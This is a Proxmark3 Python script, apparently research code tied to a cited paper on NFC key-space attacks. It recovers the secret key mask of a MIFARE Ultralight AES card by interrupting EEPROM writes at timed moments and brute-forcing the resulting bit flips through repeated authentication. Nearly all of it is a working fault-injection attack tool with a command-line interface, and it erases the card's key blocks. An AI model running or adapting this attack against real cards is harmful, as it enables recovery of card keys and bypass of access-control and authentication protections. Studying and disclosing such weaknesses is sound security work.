#!/usr/bin/env python3

# Recover the shared key mask specific to an Ultralight AES card
# 
# Conditions:
# * key blocks not locked by LOCK_KEYS
#
# Current limitations:
# * AUTH0 needs to allow unauthenticated writes to key blocks
#
# Attention points:
# * All key blocks of the corresponding key will be erased!!
#
# doegox & noproto, 2025
# cf "BREAKMEIFYOUCAN!: Exploiting Keyspace Reduction and Relay Attacks in 3DES and AES-protected NFC Technologies"
# for more info

import sys
import argparse
import time
import pm3

total_auth = 0
debug = False

def console_debug(p, command, capture=True, debug=False):
    """Print debug messages to the console if debugging is enabled."""
    if debug:
        print(command)
        sys.stdout.flush()
    p.console(command, capture=capture)


def hamming_weight(n):
    """Compute the Hamming weight (number of set bits) of an integer."""
    return bin(n).count('1')


def hamming_distance(n, m):
    """Compute the Hamming distance between two integers."""
    return bin(n ^ m).count('1')


def construct_key(key_segment, segment):
    """Construct the full key from the segment and its value."""
    assert segment < 4
    if segment == 0:
        key = f'{key_segment:08x}000000000000000000000000'
    elif segment == 1:
        key = f'00000000{key_segment:08x}0000000000000000'
    elif segment == 2:
        key = f'0000000000000000{key_segment:08x}00000000'
    elif segment == 3:
        key = f'000000000000000000000000{key_segment:08x}'
    return key


def auth(p, key_segment, idx, segment, retries=0):
    """Authenticate with the given key, key index and segment."""
    global total_auth
    assert idx < 3
    assert segment < 4
    key = construct_key(key_segment, segment)
    console_debug(p, f'hf mfu aesauth -i {idx} --key {key} --retries {retries}', debug=debug)
    success = False
    for line in p.grabbed_output.split('\n'):
        if "Authentication" in line:
            if "ok" in line:
                success = True
            if "attempts:" in line:
                start = line.find(":") + 1
                attempts = int(line[start:].strip())
                total_auth += attempts
    return success


def bruteforce_key(p, key_segment, idx, segment, retries=5, bitflips=2):
    """Bruteforce the key by flipping bits and checking authentication."""
    global total_auth
    sys.stdout.flush()
    key = construct_key(key_segment, segment)
    console_debug(p,
                  f'hf mfu aeschk -i {idx} '
                  f'-f mfulaes_segment_hw{bitflips}.dic '
                  f'--segment {segment} '
                  f'--key {key} '
                  f'--retries {retries} '
                  f'--xor', debug=debug)
    key = None
    for line in p.grabbed_output.split('\n'):
        if "Authentication attempts:" in line:
            start = line.find(":") + 1
            attempts = int(line[start:].strip())
            total_auth += attempts
        if "found valid key" in line:
            line = line[line.index("key") + 1:]
            start = line.find("[") + 1
            end = line.find("]")
            test_key = int(line[start:end].replace(" ", ""), 16)
            print(f"Auth succeeded with key: {test_key:032X}")
            sys.stdout.flush()
            key = (test_key >> (32 * (3 - segment))) & 0xFFFFFFFF
    return key


def insert_key(keys, newkey, initkey):
    """Insert a new key into the list of keys, ensuring no duplicates."""
    if newkey not in keys:
        keys.insert(0, newkey)
        keys.sort(key=lambda k: hamming_distance(k, initkey), reverse=True)
    bigflip = 0
    for key in keys:
        bigflip |= key ^ initkey
    bigkey = initkey ^ bigflip
    if bigkey not in keys:
        keys.insert(0, bigkey)
    return keys


def keys_analysis(keys, masked_key_bits, eeprom_init=None):
    known_eeprom_bits = int.from_bytes(masked_key_bits.to_bytes(4, 'big')[::-1], 'big')
    sknown = f"{known_eeprom_bits:032b}"
    maskkey = keys[0]
    print(f"Mask key:     {maskkey:08X}")
    prevkey = keys.pop()
    print(f"Antimask key: {prevkey:08X}")
    if prevkey + keys[0] != 0xFFFFFFFF:
        print("WARNING: list seems incomplete, mask & antimask don't match")
    print("EEPROM erasure:")
    unflipped = 0
    weak_unflipped = 0
    startflip = None
    while len(keys):
        key = keys.pop()
        diff = key ^ prevkey ^ 0xFFFFFFFF
        diffblock = int.from_bytes(diff.to_bytes(4, 'big')[::-1], 'big')
        sdiff=f"{diffblock:032b}"
        # print(sdiff, end='')
        sout=""
        for k, d in zip(sknown, sdiff):
            if k == '1' and d == '0':
                sout += '.'
                if startflip is None:
                    startflip = key
                    weak_unflipped = diffblock & (0xFFFFFFFF - known_eeprom_bits)
            else:
                sout += d
        print(" "*35 + sout, end='')
        # if all recovered bits are now flipped
        if diffblock & known_eeprom_bits == 0:
            print("  <=== All recovered bits have now flipped")
            unflipped |= diffblock & (0xFFFFFFFF - known_eeprom_bits)
        else:
            print()
    sbits = f"{unflipped:032b}".replace('0', ' ').replace('1', '^')
    print(" "*35 + f"{sbits}  <=== Unflipped in time, assumed to be 0 in the target key in EEPROM => mask in the target key")
    if eeprom_init is not None:
        print(f"     EEPROM bits init:   {eeprom_init:08X} ({eeprom_init:032b})")
    # newblock = int.from_bytes(newkey_masked.to_bytes(4, 'big')[::-1], 'big')
    sbits = f"{known_eeprom_bits:032b}".replace('0', ' ')
    print(f"    EEPROM bits found:   {known_eeprom_bits:08X} ({sbits})")
    sbits = f"{weak_unflipped:032b}".replace('0', ' ').replace('1', '0')
    print(f"    EEPROM bits found:   {weak_unflipped:08X} ({sbits})")
    maskblock = int.from_bytes(maskkey.to_bytes(4, 'big')[::-1], 'big')
    print(f"            Mask bits:   {maskblock:08X} ({maskblock:032b})")
    # Recovered key bits: inversed mask bits only if corresponding EEPROM bits are set
    inversed_mask_bits = ''.join(
        '1' if (known_eeprom_bits & (1 << i)) and not (maskblock & (1 << i)) else
        '0' if (known_eeprom_bits & (1 << i)) and (maskblock & (1 << i)) else
        '.'
        for i in range(31, -1, -1)
    )
    print(f" Recovered block bits:             {inversed_mask_bits}")
    inversed_mask_bits = ''.join(
        '0' if (weak_unflipped & (1 << i)) and not (maskblock & (1 << i)) else
        '1' if (weak_unflipped & (1 << i)) and (maskblock & (1 << i)) else
        '.'
        for i in range(31, -1, -1)
    )
    print(f" Recovered block bits:             {inversed_mask_bits}")
    if eeprom_init is not None:
        print(f"      Block bits init:   {eeprom_init^maskblock:08X} ({eeprom_init^maskblock:032b})")
        errors = ''.join(
            '^' if (weak_unflipped & (1 << i)) and (eeprom_init & (1 << i)) else
            ' '
            for i in range(31, -1, -1)
        )
        print(f"               Errors:             {errors}")


def main_test():
    # tearing evolution from last key (antimask) to first (mask)
    keys = [0xF1FE673F, 0x71FE673F, 0x71DE673F, 0x51DE673F, 0x51DE67BF, 0x55DE67BF, 0x45DE67BF, 0x45DE67BB, 0x45DE67FB, 0x45DE67FA, 0x45DE67F2, 0x45DE77FA, 0x45DE37FA, 0x44DE37FA, 0x45D637FA, 0x45D635FA, 0x44D635FA, 0x45D634FA, 0x44D634FA, 0x44D634F2, 0x44D634E2, 0x44C634E2, 0x4CC634E2, 0x4CC234E2, 0x4CC234C2, 0x4C8234C2, 0x4C82B4C2, 0x4C8294C2, 0x4C8290C2, 0x4E8290C2, 0x4E8298C2, 0x0E8298C2, 0x0E8098C2, 0x0E8098C0, 0x0E8198C0, 0x0E0198C0,]
    masked_key_bits=0xB0000200
    eeprom_init=0x00FF00FF
    keys_analysis(keys, masked_key_bits, eeprom_init)


def main():
    """
    Recover the shared key mask specific to an Ultralight AES card

    Conditions:
    * key blocks not locked by LOCK_KEYS

    Current limitations:
    * AUTH0 needs to allow unauthenticated writes to key blocks

    Attention points:
    * All key blocks of the corresponding key will be erased!!

    Examples:

    - Recover key mask block 48 (DataProt):
          $ pm3 -y 'mfulaes_mask_recovery --block 48'
      or, from the client:
          pm3 --> script run mfulaes_mask_recovery --block 48
    """
    parser = argparse.ArgumentParser(
        description=main.__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument('--block', type=lambda x: int(x, 0), required=True,
                        help='Block number (hex or int) DataProt:48-51 UIDRetr:52-55')
    parser.add_argument('--eeprom_init', type=lambda x: int(x, 0), default=None,
                        help='Initial key block EEPROM value (hex). def: None')
    parser.add_argument('--tear1', type=int, default=280, help='First tearoff value (us)')
    parser.add_argument('--tear2', type=int, default=230, help='Second tearoff value (us)')
    parser.add_argument('--max_hd_diff', type=int, default=2, help='Maximum Hamming distance difference')
    parser.add_argument('--fast_retries', type=int, default=10, help='Number of fast retries')
    parser.add_argument('--slow_retries', type=int, default=3, help='Number of slow retries')
    parser.add_argument('--mask', type=lambda x: int(x, 0), default=0, help='Key mask (16-byte hex)')
    parser.add_argument('--masked_key_bits', type=lambda x: int(x, 0), default=0, help='Recovered key bits, masked (4-byte hex, 1=recovered)')
    parser.add_argument('--debug', action='store_true', help='Enable debug output')
    args = parser.parse_args()

    final = 0x00000000
    eeprom_init = args.eeprom_init
    masked_key_bits = args.masked_key_bits
    block = args.block
    tear1 = args.tear1
    tear2 = args.tear2
    max_hd_diff = args.max_hd_diff
    fast_retries = args.fast_retries
    slow_retries = args.slow_retries
    global debug
    debug = args.debug
    segment = 3 - ((block - 48) % 4)
    idx = (block - 48) // 4
    assert idx < 2
    # keep only mask portion we're interested in
    maskkey = (args.mask >> (32 * (3 - segment))) & 0xFFFFFFFF
    antimaskkey = 0xFFFFFFFF - maskkey
    initkey = antimaskkey
    init = int.from_bytes(initkey.to_bytes(4, 'big')[::-1], 'big')
    print(f"Initkey: {initkey:032X}")
    ntear2 = 0
    max_hd = 0
    keys = []
    p = pm3.pm3()
    start_time = time.time()
    # Erase the key
    console_debug(p, 'hw tearoff --off', capture=False, debug=debug)
    for i in range(48 + 4*idx, 52 + 4*idx):
        console_debug(p, f'hf 14a raw -sc a2{i:02x}00000000', capture=False, debug=debug)
    assert auth(p, 0, idx, 0), "We cannot erase the key, aborting..."
    while tear1 > 0:
        console_debug(p, 'hw tearoff --off', capture=False, debug=debug)
        console_debug(p, f'hf 14a raw -sc a2{block:02x}{init:08x}', capture=False, debug=debug)
        print(f"Testing with initial tearoff value: {tear1} ms")
        console_debug(p, f'hw tearoff --delay {tear1}', capture=False, debug=debug)
        console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
        console_debug(p, f'hf 14a raw -sc a2{block:02x}{final:08x}', capture=False, debug=debug)
        key = initkey
        if auth(p, key, idx, segment):
            break
        tear1 -= 5
        tear2 -= 5
    assert tear1 > 0

    console_debug(p, f'hw tearoff --delay {tear2}', capture=False, debug=debug)

    keys.insert(0, key)

    while True:
        print("Keys:", '['+' '.join([f"0x{k:08X}," for k in keys]) + ']')
        print(f"Tears: "f"1*{tear1}ms + {ntear2}*{tear2}ms")
        print(f"Max HD: {max(hamming_distance(k, initkey) for k in keys)}")
        sys.stdout.flush()
        nsame = 0
        tear2_copy = tear2
        tear2_changed = False
        while auth(p, key, idx, segment, retries=fast_retries):
            print(f"Testing with extra tearoff value: {tear2_copy} ms")
            sys.stdout.flush()
            console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
            console_debug(p, f'hf 14a raw -sc a2{block:02x}{final:08x}', capture=False, debug=debug)
            ntear2 += 1
            nsame += 1
            if ((nsame >= 20 and key != initkey) or nsame >= 40) and not tear2_changed:
                tear2_copy = int(tear2 * 1.05)
                console_debug(p, f'hw tearoff --delay {tear2_copy}', capture=False, debug=debug)
                tear2_changed = True
            if (keys[0] == maskkey) or (nsame >= 100):
                if (keys[0] == maskkey):
                    print(f"Stopping after having reached mask value.")
                else:
                    print(f"Stopping after {nsame} successful authentications with the same key, mask not yet reached :(")
                    print(f'Block {block:2} (0x{block:02x}) segment:'
                        f' {keys[0]:08X} mask: {maskkey:08X} diff: {keys[0] ^ maskkey:08X}')
                print("Keys:", '['+' '.join([f"0x{k:08X}," for k in keys]) + ']')
                print(f"Tears: "f"1*{tear1}ms + {ntear2}*{tear2}ms (last {nsame} tears just for confirmation)")
                print(f"Total authentications: {total_auth}")
                current_time = time.time()
                elapsed_time = current_time - start_time
                minutes, seconds = divmod(elapsed_time, 60)
                print(f"Time spent since start: {int(minutes)} minutes {seconds:.2f} seconds")
                sys.stdout.flush()
                keys_analysis(keys, masked_key_bits, eeprom_init)
                # Erase the key
                console_debug(p, 'hw tearoff --off', capture=False, debug=debug)
                for i in range(48 + 4*idx, 52 + 4*idx):
                    console_debug(p, f'hf 14a raw -sc a2{i:02x}00000000', capture=False, debug=debug)
                return
        if tear2_changed:
            console_debug(p, f'hw tearoff --delay {tear2}', capture=False, debug=debug)

        newkey = None
        for key in keys:
            if abs(max_hd - hamming_distance(key, initkey)) > max_hd_diff:
                continue
            print(f"Trying known keys: {key:08X}")
            sys.stdout.flush()
            if auth(p, key, idx, segment, fast_retries):
                newkey = key
                break
        else:
            for _ in range(3):  # retries
                for key in keys:
                    if abs(max_hd - hamming_distance(key, initkey)) > max_hd_diff:
                        continue
                    print(f"Trying 1 bitflip from key: {key:08X}")
                    sys.stdout.flush()
                    newkey = bruteforce_key(p, key, idx, segment, fast_retries, bitflips=1)
                    if newkey is not None:
                        break
                if newkey is not None:
                    break
            if newkey is None:
                for _ in range(3):  # retries
                    for key in keys:
                        if abs(max_hd - hamming_distance(key, initkey)) > max_hd_diff:
                            continue
                        print(f"Trying 2 bitflips from key: {key:08X}")
                        sys.stdout.flush()
                        newkey = bruteforce_key(p, key, idx, segment, slow_retries, bitflips=2)
                        if newkey is not None:
                            break
                    if newkey is not None:
                        break
        assert newkey is not None
        if newkey not in keys:
            keys = insert_key(keys, newkey, initkey=initkey)
            max_hd = max(hamming_distance(k, initkey) for k in keys)
            print(f"New key found: {newkey:08X} with HD={hamming_distance(newkey, initkey):02d}, "
                  f"max HD in keys: {max_hd:02d}")
            sys.stdout.flush()
        key = max(keys, key=lambda k: hamming_distance(k, initkey))
        print(f"Testing with extra tearoff value: {tear2_copy} ms")
        sys.stdout.flush()
        console_debug(p, 'hw tearoff --on', capture=False, debug=debug)
        console_debug(p, f'hf 14a raw -sc a2{block:02x}{final:08x}', capture=False, debug=debug)
        ntear2 += 1


if __name__ == '__main__':
    main()
